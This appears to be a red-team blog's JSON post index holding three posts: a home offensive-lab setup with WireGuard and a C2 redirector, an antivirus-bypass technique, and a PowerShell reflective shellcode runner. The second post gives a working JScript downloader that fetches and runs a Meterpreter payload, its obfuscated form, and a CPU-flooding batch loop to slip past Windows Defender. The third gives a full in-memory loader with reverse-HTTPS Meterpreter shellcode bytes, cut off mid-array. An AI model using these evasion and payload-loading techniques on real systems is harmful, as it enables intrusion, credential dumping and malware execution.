[
  
  {
    "title": "Cybersecurity Home Lab",
    "url": "/posts/cybersecurity-home-lab/",
    "categories": "",
    "tags": "",
    "date": "2025-07-15 00:00:00 +0200",
    "content": "Setting Up a Home Lab/Offensive Infrastructure Using Your Unused PC  Since Ludus is the thing everyone is talking about recently and doing really crazy stuff with it like this https://specterops.io/blog/2025/07/14/ludushound-raising-bloodhound-attack-paths-to-life/ , I decided to write a blog demonstrating how you can install and play with it to get some practice.  Why pay for cybersecurity lab subscriptions? Create your own private cloud instead.  If you’re a cybersecurity professional looking for a network to practice on, this is the most cost-effective solution available. Ludus comes with its own set of predefined labs like GOAD, SCCM lab, and more.  You can reuse the same home infrastructure and simply switch VPS/domains for different offensive operations.  Requirements     ~$2-5 per month for a single 512MB - 2GB RAM VPS (Hint: Look beyond expensive countries for affordable options)   A computer/laptop (RAM and vCPU cores are critical—the more, the better. My setup includes an NVIDIA GPU for hash cracking. SSD is highly recommended)   What You’ll Achieve  In this blog post, we’ll cover:     Proxmox + Ludus setup   WireGuard reverse VPN from VPS   The magic of socat UDP and SSH tunneling   Hash cracking station with a discrete GPU   BONUS: Domain registration, SSL, and DNS setup for Havoc C2   This setup will enable you to:     Host infrastructure locally while exposing it to the internet without expensive dedicated servers   Access your home lab via VPN from anywhere (great for collaboration)   Run hash cracking on the same Proxmox node   Keep all your offensive tools organized in one place   DISCLAIMER - READ THIS CAREFULLY!     The information in this blog is exclusively for learning and research purposes.   Do not use this knowledge to attack networks outside authorized scope.   Exercise extreme caution—improper setup could expose your home network to the entire internet.     Part 1 - Installing Debian, Proxmox, and Ludus  Download debian from https://www.debian.org/distrib/ . Flash SD card and follow the instalation steps. Once completed, install Ludus - https://docs.ludus.cloud/docs/quick-start/install-ludus/ .  /etc/pve/storage.cfg config  root@proxmox:~# cat /etc/pve/storage.cfg dir: local     path /var/lib/vz     content images,rootdir     prune-backups keep-all=1  dir: HDD     path /mnt/HDD     content backup,iso,vztmpl,snippets     prune-backups keep-all=1   Ludus range  export LUDUS_API_KEY='INFR.redacted'   Part 2 - VPS, WireGuard, and Firewall Rules  Wireguard configuration  wg-quick up ~/bridge.conf  sudo wg-quick up bridge  sudo wg show  sudo wg-quick down bridge   Change keys, network interface names, 10.8.8.0/24 CIDR, etc.. everywhere in the configs below to match your environment.  PROXMOX:  root@proxmox:~# cat /etc/wireguard/bridge.conf [Interface] Address = 10.10.10.3/32 PrivateKey = redacted ListenPort = 60066                                                                                                                                                                                 # PostUp: Set up forwarding rules, NAT, and routing PostUp = iptables -A FORWARD -i bridge -j ACCEPT PostUp = iptables -A FORWARD -o bridge -j ACCEPT PostUp = iptables -t nat -A POSTROUTING -o enp4s0 -j MASQUERADE PostUp = iptables -t nat -A POSTROUTING -s 10.10.10.1 -o vmbr1000 -j MASQUERADE PostUp = iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -d 10.8.8.0/24 -j MASQUERADE PostUp = ip route del 10.8.8.0/24 via 192.0.2.108 dev vmbr1000 2&gt;/dev/null || true PostUp = ip route add 10.8.8.0/24 via 192.0.2.108 dev vmbr1000  # PostDown: Clean up rules and routing (reverse order) PostDown = ip route del 10.8.8.0/24 via 192.0.2.108 dev vmbr1000 2&gt;/dev/null || true PostDown = iptables -t nat -D POSTROUTING -s 10.10.10.0/24 -d 10.8.8.0/24 -j MASQUERADE 2&gt;/dev/null || true PostDown = iptables -t nat -D POSTROUTING -s 10.10.10.1 -o vmbr1000 -j MASQUERADE 2&gt;/dev/null || true PostDown = iptables -t nat -D POSTROUTING -o enp4s0 -j MASQUERADE 2&gt;/dev/null || true PostDown = iptables -D FORWARD -o bridge -j ACCEPT 2&gt;/dev/null || true PostDown = iptables -D FORWARD -i bridge -j ACCEPT 2&gt;/dev/null || true  [Peer] PublicKey = redacted AllowedIPs = 10.10.10.0/24 Endpoint = 94.141.102.251:51820 PersistentKeepalive = 25 root@proxmox:~#   Bridge on VPS:  root@878172:~# cat /etc/wireguard/wg0.conf [Interface] Address = 10.10.10.1/24 ListenPort = 51820 PrivateKey = redacted PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE; ip route add 10.8.8.0/24 via 10.10.10.3 dev wg0 PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE; ip route del 10.8.8.0/24 via 10.10.10.3 dev wg0  # Router to networks (bridge interface on proxmox) [Peer] PublicKey = redacted AllowedIPs = 10.8.0.0/16, 10.10.10.3/32 Endpoint = 192.168.1.123:60066 PersistentKeepalive = 25  # Client 1 [Peer] PublicKey = redacted AllowedIPs = 10.10.10.5/32 root@878172:~#   Client 1 VPN  [Interface] PrivateKey = redacted Address = 10.10.10.5/32 DNS = 1.1.1.1, 8.8.8.8  [Peer] PublicKey = redacted AllowedIPs = 10.8.0.0/16, 10.10.10.0/24 Endpoint = 94.141.102.251:51820 PersistentKeepalive = 25   Part 3 - Socat UDP and SSH Tunneling  Part 4 - Hash Cracking Station with NVIDIA Discrete GPU  Guest OS (kali)  sudo nano /etc/default/grub sudo update-grub   GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt vfio-pci ids=10de:2504,10de:228e\"   sudo apt install nvidia-driver nvidia-cuda-toolkit nvidia-settings sudo apt install nvidia-cuda-toolkit sudo apt install nvidia-settings sudo nvidia-smi lspci -k -nn | grep -A 2 -i nvidia sudo modprobe nvidia sudo dmesg| grep -i nvidia sudo hashcat -I   sudo apt-get purge nvidia* sudo apt-get autoremove  sudo apt install xrdp -y sudo systemctl start xrdp -y sudo systemctl start xrdp sudo systemctl enable xrdp   https://developer.download.nvidia.com/compute/nvidia-driver/redist/nvidia_driver/linux-x86_64/nvidia_driver-linux-x86_64-535.216.03-archive.tar.xz  https://us.download.nvidia.com/XFree86/Linux-x86_64/570.144/NVIDIA-Linux-x86_64-570.144.run  lspci -nnk | grep -A 3 -i nvidia dpkg -l | grep nvidia sudo modprobe nvidia dmesg | grep nvidia lspci -nnk | grep -A 3 -i vfio sudo dkms build -m nvidia -v 535.216.03 sudo dkms install -m nvidia -v 535.216.03 dmesg | grep -i nvidia sudo apt install linux-headers-6.11.2-amd64 sudo dkms build -m nvidia -v 535.216.03 sudo dkms install -m nvidia -v 535.216.03 sudo apt remove --purge nvidia-* sudo apt update -y sudo apt autoremove -y sudo apt install nvidia-driver sudo apt install linux-headers-$(uname -r) sudo dkms build -m nvidia -v 535.216.03 sudo dkms install -m nvidia -v 535.216.03 sudo modprobe nvidia nvidia-smi lsmod | grep nvidia   Host (Proxmox)  GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt pcie_acs_override=downstream,multifunction nofb nomodeset video=vesafb:off,efifb:off\"   /etc/modprobe.d/blacklist.conf   blacklist nouveau snd_hda_intel options nouveau modeset=0  blacklist radeon blacklist nouveau blacklist nvidia blacklist nvidiafb options vfio_iommu_type1 allow_unsafe_interrupts=1 options kvm ignore_msrs=1 blacklist nvidiafb options vfio-pci ids=10de:2504,10de:228e disable_vga=1   /etc/pve/qemu-server/100.conf   boot: order=scsi0;net0 cores: 2 cpu: x86-64-v2-AES hostpci0: mapping=GPU memory: 8192 meta: creation-qemu=9.0.2,ctime=1737633367 name: kali net0: virtio=BC:24:11:76:D7:7F,bridge=vmbr0,firewall=1 numa: 0 ostype: l26 scsi0: HDD:vm-100-disk-0,iothread=1,size=128G scsihw: virtio-scsi-single smbios1: uuid=d4c82d4b-194f-45af-9a4e-10c621533089 sockets: 2 vmgenid: 873207c3-c88c-4146-88e1-5af464242e64   Sources  deb http://ftp.pl.debian.org/debian bookworm main contrib deb http://ftp.pl.debian.org/debian bookworm-updates main contrib deb http://security.debian.org bookworm-security main contrib  deb [arch=amd64] https://apt.releases.hashicorp.com bookworm main deb http://download.proxmox.com/debian/ceph-quincy bookworm no-subscription deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription   Part 5 - Setting Up a Redirector: Domain, SSL, and Havoc DNS Listener  Service  [Unit] Description=SSH Port Forwarding for apache web server After=network.target  [Service] ExecStart=/usr/bin/ssh -N -L 0.0.0.0:80:127.0.0.1:80 -i /root/.ssh/id_rsa proxmox@192.168.1.123 Restart=always RestartSec=10  [Install] WantedBy=multi-user.target"
  },
  
  {
    "title": "Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe",
    "url": "/posts/starving-defender/",
    "categories": "REDTEAM",
    "tags": "evasion, meterpreter",
    "date": "2025-07-12 00:00:00 +0200",
    "content": "JS Launcher  This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors.  To download a Meterpreter payload to the disk, we will use cscript.exe by creating a downloader.js file and double-clicking it.  var url = \"http://10.8.8.8/met.exe\" var Object = WScript.CreateObject('MSXML2.XMLHTTP'); Object.Open('GET', url, false); Object.Send(); if (Object.Status == 200) {     var Stream = WScript.CreateObject('ADODB.Stream');     Stream.Open();     Stream.Type = 1;     Stream.Write(Object.ResponseBody);     Stream.Position = 0;     Stream.SaveToFile(\"met.exe\", 2);     Stream.Close(); } var r = new ActiveXObject(\"WScript.Shell\").Run(\"met.exe\");   Both the JS script and the downloaded Meterpreter payload are detected statically before execution.  The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/.  The resulting script will look like this:  var _0x17d249=_0x1fcc;(function(_0x8d99f4,_0x5b012c){var _0x2cbcff=_0x1fcc,_0x176630=_0x8d99f4();while(!![]){try{var _0x516bb3=-parseInt(_0x2cbcff(0x1f5))/0x1+-parseInt(_0x2cbcff(0x1ec))/0x2+-parseInt(_0x2cbcff(0x1e5))/0x3*(parseInt(_0x2cbcff(0x1f2))/0x4)+parseInt(_0x2cbcff(0x1e7))/0x5+-parseInt(_0x2cbcff(0x1e6))/0x6*(-parseInt(_0x2cbcff(0x1f3))/0x7)+parseInt(_0x2cbcff(0x1ef))/0x8+-parseInt(_0x2cbcff(0x1ea))/0x9*(-parseInt(_0x2cbcff(0x1f1))/0xa);if(_0x516bb3===_0x5b012c)break;else _0x176630['push'](_0x176630['shift']());}catch(_0x444b68){_0x176630['push'](_0x176630['shift']());}}}(_0x4958,0x52d5f));var url=_0x17d249(0x1f8),Object=WScript[_0x17d249(0x1e4)]('MSXML2.XMLHTTP');Object['Open'](_0x17d249(0x1f6),url,![]),Object['Send']();if(Object[_0x17d249(0x1e8)]==0xc8){var Stream=WScript['CreateObject'](_0x17d249(0x1ee));Stream[_0x17d249(0x1f0)](),Stream[_0x17d249(0x1e9)]=0x1,Stream[_0x17d249(0x1f4)](Object[_0x17d249(0x1f9)]),Stream[_0x17d249(0x1eb)]=0x0,Stream[_0x17d249(0x1f7)]('met.exe',0x2),Stream['Close']();}var r=new ActiveXObject(_0x17d249(0x1fa))[_0x17d249(0x1ed)]('met.exe');function _0x1fcc(_0x5aab95,_0x3af232){var _0x495812=_0x4958();return _0x1fcc=function(_0x1fcc18,_0xbf485){_0x1fcc18=_0x1fcc18-0x1e4;var _0xf5897c=_0x495812[_0x1fcc18];return _0xf5897c;},_0x1fcc(_0x5aab95,_0x3af232);}function _0x4958(){var _0x88af5=['174024sBDVKk','6aCgHFV','2711895TrvrLm','Status','Type','9307413HbmAyM','Position','792432hvPFro','Run','ADODB.Stream','470216MBGiiE','Open','10fGQDlo','36dgRipP','779387TmqUOV','Write','489071HUhQcm','GET','SaveToFile','http://10.8.8.8/met.exe','ResponseBody','WScript.Shell','CreateObject'];_0x4958=function(){return _0x88af5;};return _0x4958();}   Save it on the desktop as obf.js and attempt to execute it.  Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security.  Overloading the CPU    To successfully execute Meterpreter with this technique, we need to spam multiple cscript.exe processes running our obf.js script, which will exhaust the CPU due to Defender’s MsMpEng.exe process.  This time, we will create a separate launcher.bat script that spawns multiple instances of our malicious JS payload execution via a for loop.  @echo off for /l %%i in (1,1,500) do (     cscript //nologo obf.js )   We can execute this batch script multiple times and wait a few seconds.               Your browser does not support the video tag.      After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations."
  },
  
  {
    "title": "Reflective shellcode runner in PowerShell",
    "url": "/posts/ref-she-run-pwsh/",
    "categories": "REDTEAM",
    "tags": "powershell, shellcode, reflection, winapi, evasion, meterpreter",
    "date": "2025-06-24 00:00:00 +0200",
    "content": "Part 1 - Understanding the mechanics  LookupFunc: finding Windows API modules and functions  We’ll examine how to call Windows API functions from PowerShell, starting with displaying a message box.  First, we need a way to locate functions in DLLs. We can use technique known as dynamic lookup. We will create the .NET assembly in memory. To perform a dynamic lookup of function addresses the operating system provides two Win32 APIs called GetModuleHandle and GetProcAddress.  GetModuleHandle obtains a handle to the specified DLL, which is the memory address of the DLL. To find address of specific function we need to pass the DLL handle and the desired function to GetProcAddress which will return the function address.  We are relaying on GetAssemblies to search preloaded assemblies in the PowerShell process. We will loop through all assemblies and invoke GetTypes to obtain methods and structures. When C# code wants to directly invoke Win32 APIs it must provide the Unsafe keyword. Any functions to be be used must be declared as static to avoid instantiation. All these methods are ments to be used internally by the .NET code. This blocks us calling them directly from PowerShell or C#. To call them indirectly we need to obtain reference to these functions but firstly we must obtain a reference to the System.dll assembly using the Get-Type method. This will allow to subsequently locate the GetModuleHandle and GetProcAddress methods inside this dll.  Using GetType to obtain a reference to the System.dll assembly at runtime is an example of the Reflection technique.  We can use internal Invoke method to call GetModuleHandle and obtain the base address of an unmanaged DLL. The returned value is decimal and we transfer it into hexadecimal quivalent to obtain the actual memory address. The same applies to GetProcAddress.  The LookupFunc helper function does this by:     Accessing .NET’s internal methods through reflection   Finding GetProcAddress (which locates function addresses)   Returning the memory address of our desired function   Function below locates memory addresses of function in DLL. We’ll use it to find MessageBoxA from user32.dll.  function LookupFunc {     Param (         $moduleName,         $functionName     )      $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |          Where-Object {             $_.GlobalAssemblyCache -And              $_.Location.Split('\\\\')[-1].Equals('System.dll')         }     ).GetType('Microsoft.Win32.UnsafeNativeMethods')      $tmp = @()          $assem.GetMethods() | ForEach-Object {         If ($_.Name -eq \"GetProcAddress\") {             $tmp += $_         }     }          return $tmp[0].Invoke( # Using the first `GetProcAddress` function.         $null,          @(             ($assem.GetMethod('GetModuleHandle')).Invoke(                 $null,                  @($moduleName)             ),              $functionName         )     ) }   Formatted one, to use less lines of code:  function LookupFunc { \tParam ($moduleName, $functionName) \t$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods') \t$tmp=@() \t$assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}} \treturn $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) \t}   Later in our code, we will use it to save the result into a variable using format like so:  $Variable = LookupFunc \"nameof.dll\" \"WinAPIFunctionName\"    DelegateType reflection - calling resolved functions  We create a DelegateType reflection to call the resolved function from unmanaged module address.  The information about the number of arguments and their associated data types must be paired with the resolved function memory address. In C# this is done using the GetDelegateForFunctionPointer method. It takes two arguments - memory address of the function (which we already know how to obtain) and function protorype represented as a type that we need to create.  In C# a function prototype is known as Delegate or Delegate type.  Key steps:     LookupFunc finds MessageBoxA address in our example   Creation of a new dynamic reflection assembly object   Getting current AppDomain   Defining dynamic assembly with executable permissions   Creation of dynamic module object inside of assembly   Custom type creation   Defining constructor with MessageBoxA’s signature   Setting implementation flags   Creating Invoke method   Creating delegate type instance   GetDelegateForFunctionPointer (Connecting our native function pointer to the managed delegate)   Calling the function   This will result in a call to the function and message box will pop-up with our custom text.  $MessageBoxA = LookupFunc \"user32.dll\" \"MessageBoxA\" # Saving resolved address to the variable  # 1. Create a dynamic assembly to host our delegate  $MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate') # Creating a new reflection assembly object with name 'ReflectedDelegate'  $Domain = [AppDomain]::CurrentDomain # Retrieves the current application domain (AppDomain) in which the PowerShell session is running  $MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) # Setting executable permissions on assembly. Specifies that the assembly can only be executed in memory and cannot be saved to disk  # 2. Create a module within the assembly  $MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false) # Creating Module inside of assembly. Setting custom module name. Second $false argument will exclude symbol information.  # Now we can create a custom type that will become our delegate type.  # 3. Define our custom delegate type  $MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate]) # The first argument is a custom name. # Second is the list of attributes for the type. We set it to class so that later it can be instantiated. Public, non-executable and use ASCII instead of Unicode. Finally, it is set to be interpreted automatically since this undocumented setting is required. # Third argument, we specify type it builds on top of. 'MulticastDelegate' will allow us to create a delegate type with multiple entries which will allow to call the target API with multiple arguments.  # Now we can put function prototype inside the newly created Type '$MyTypeBuilder' and let it become our custom delegate type.  # 4. Create constructor matching MessageBoxA signature  $MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(  \t'RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int])  ) # The first argument - atributes of the constructor itself. We make it Public and require it to be referenced by both name and signature by setting HideBySig, RTSpecialName and Public. # The second arguemnt - calling convention for the constructor. This defines how arguments and return values are handles on the low level by .NET framework. (The default one is in use. # The last argument - parameter types of the constructor that will become the function prototype. Basically, the arguments types of the function we would like to invoke.   #With the constructor created, we must call it. Before that, implementation flags must be set.  Runtime - used at runtime. Managed - the code is managed. =)  $MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')  # Constructor is set up. No need to modify it or add anything else. But, in order to invoke it, we must tell .NET that delegate type to be used in calling a function. Let's define a separate thing, the Invoke method via 'DefineMethod' which takes settings of '$MyTypeBuilder'.  # DefineMethod takes 4 arguments. # Name of the method. Method attributes. NewSlot and Virtual in second arg used to indicate that the method is virtual and ensure it always gets a new slot in the vtable. # Third arg - return type of the function, which for example 'MessageBoxA' is int. # Fourth - array of argument types for the function we would like to call.  # 5. Define the Invoke method (actual function call)  $MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))  # Just as with constructor, we must set the implementation flags to allow the Invoke method to be called.  $MyMethodBuilder.SetImplementationFlags('Runtime, Managed')  # And finally, we create the delegate type object by instantiating $MyTypeBuilder.  # 6. Finalize the type  $MyDelegateType = $MyTypeBuilder.CreateType()   # We suply to $MyFunction the result of GetDelegateForFunctionPointer() function.  # 7. Connect our function pointer to the delegate  $MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer( \t$MessageBoxA, \t$MyDelegateType )  # 8. Call MessageBoxA  $MyFunction.Invoke([IntPtr]::Zero, \"Hello World\", \"This is My MessageBox!\", 0)     If you read carefully, you might notice that we never call the defined constructor.  We don’t explicitly call MyConstructorBuilder because it’s used internally by .NET when we create the delegate with GetDelegateForFunctionPointer - the constructor defines the delegate’s structure, and .NET automatically uses it when converting the function pointer to a managed delegate. The Invoke method is what we call directly, while the constructor works behind the scenes.  Bonus - Invoking WinExec  Using the same technique, we can launch applications. we we will create a child process by spawning instance of notepad.exe process.  As previously, we declare and use LookupFunc to identify the memory addresses. This time, for WinExec from KERNEL32.dll.  To find the proper data types we can use resources below:     https://www.pinvoke.net/default.aspx/kernel32.winexec   https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec   https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow   function LookupFunc {  \tParam ($moduleName, $functionName)  \t$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods') \t$tmp=@() \t$assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}} \t \treturn $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) \t}  $WinExecFunc = LookupFunc \"kernel32.dll\" \"WinExec\" # Saving resolved address to the variable   $MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')  $Domain = [AppDomain]::CurrentDomain  $MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)  $MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)  $MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])  $MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(  \t'RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([String],[int]) # The third parameter - the arguments types of the WinExec function we would like to invoke.  )  $MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')  $MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([String],[int])) # Fourth argumtnt - array of argument types for the WinExec function.  $MyMethodBuilder.SetImplementationFlags('Runtime, Managed')  $MyDelegateType = $MyTypeBuilder.CreateType()  $MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WinExecFunc, $MyDelegateType)  # Calling the WinExec function to create Notepad process.  $MyFunction.Invoke(\"notepad.exe\", 5)     Key Differences:    We use WinExec instead of MessageBoxA   The delegate type matches WinExec’s simpler signature (just String and int parameters)   The second parameter 5 makes the window visible (SW_SHOW)     Part 2 - Loading shellcode  Since we need to call three different Win32 APIs (VirtualAlloc, CreateThread and WaitForSingleObject), we’ll rewrite the portion of code that creates the delegate type into a function so that we can call it multiple times. The resulting function is going to be getDelegateType. It should accept two arguments: the function arguments we would like to call gives as an array and it’s return type.  function getDelegateType {      Param (         [Parameter(Position = 0, Mandatory = $True)] [Type []] $func, # Array of function arguments         [Parameter(Position = 1)] [Type] $delType = [Void] # Data type of return value     )      $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),     [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, SnsiClass', [System.MulticastDelegate])      $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')      $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')      return $type.CreateType()  }   The complete code to load our Meterpreter shellcode is shown below:  function LookupFunc { \tParam ($moduleName, $functionName) \t$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods') \t$tmp=@() \t$assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}} \treturn $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) \t}  function getDelegateType {      Param (         [Parameter(Position = 0, Mandatory = $True)] [Type []] $func, # Array of function arguments         [Parameter(Position = 1)] [Type] $delType = [Void] # Data type of return value     )      $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),     [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])      $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')          $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')               return $type.CreateType() }  # Creating delegates for `VirtualAlloc`, `CreateThread` and `WaitForSingleObject`.  # https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc - Microsoft Docs # https://www.pinvoke.net/default.aspx/kernel32.virtualalloc - PInvoke # https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/  $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)  # Meterpreter shellcode  # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.8.9.9 LPORT=443 EXITFUNC=thread -f ps1  [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,0x48,0x1,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0xe8,0x51,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,0x57,0x69,0x6e,0x36,0x34,0x3b,0x20,0x78,0x36,0x34,0x3b,0x20,0x72,0x76,0x3a,0x31,0x33,0x33,0x2e,0x30,0x29,0x20,0x47,0x65,0x63,0x6b,0x6f,0x2f,0x32,0x30,0x31,0x30,0x30,0x31,0x30,0x31,0x20,0x46,0x69,0x72,0x65,0x66,0x6f,0x78,0x2f,0x31,0x33,0x33,0x2e,0x30,0x0,0x59,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x9,0x0,0x0,0x0,0x31,0x30,0x2e,0x38,0x2e,0x39,0x2e,0x39,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x90,0x0,0x0,0x0,0x2f,0x35,0x43,0x4d,0x59,0x56,0x31,0x30,0x42,0x35,0x43,0x39,0x41,0x71,0x45,0x47,0x71,0x4b,0x4d,0x42,0x38,0x38,0x51,0x38,0x41,0x70,0x52,0x72,0x52,0x63,0x4e,0x47,0x64,0x44,0x77,0x62,0x76,0x4e,0x70,0x6e,0x66,0x65,0x49,0x71,0x6a,0x73,0x31,0x46,0x4b,0x7a,0x6f,0x6c,0x78,0x46,0x49,0x6f,0x79,0x47,0x69,0x61,0x42,0x32,0x6c,0x6f,0x61,0x69,0x4b,0x67,0x52,0x6b,0x6e,0x6b,0x4f,0x32,0x32,0x38,0x4d,0x72,0x77,0x57,0x57,0x4e,0x53,0x4b,0x5f,0x46,0x53,0x2d,0x2d,0x73,0x57,0x6b,0x75,0x4d,0x37,0x4b,0x64,0x4a,0x5f,0x6d,0x4d,0x36,0x4a,0x30,0x6c,0x31,0x6a,0x4c,0x68,0x67,0x6b,0x67,0x4b,0x43,0x30,0x56,0x4b,0x51,0x46,0x54,0x43,0x51,0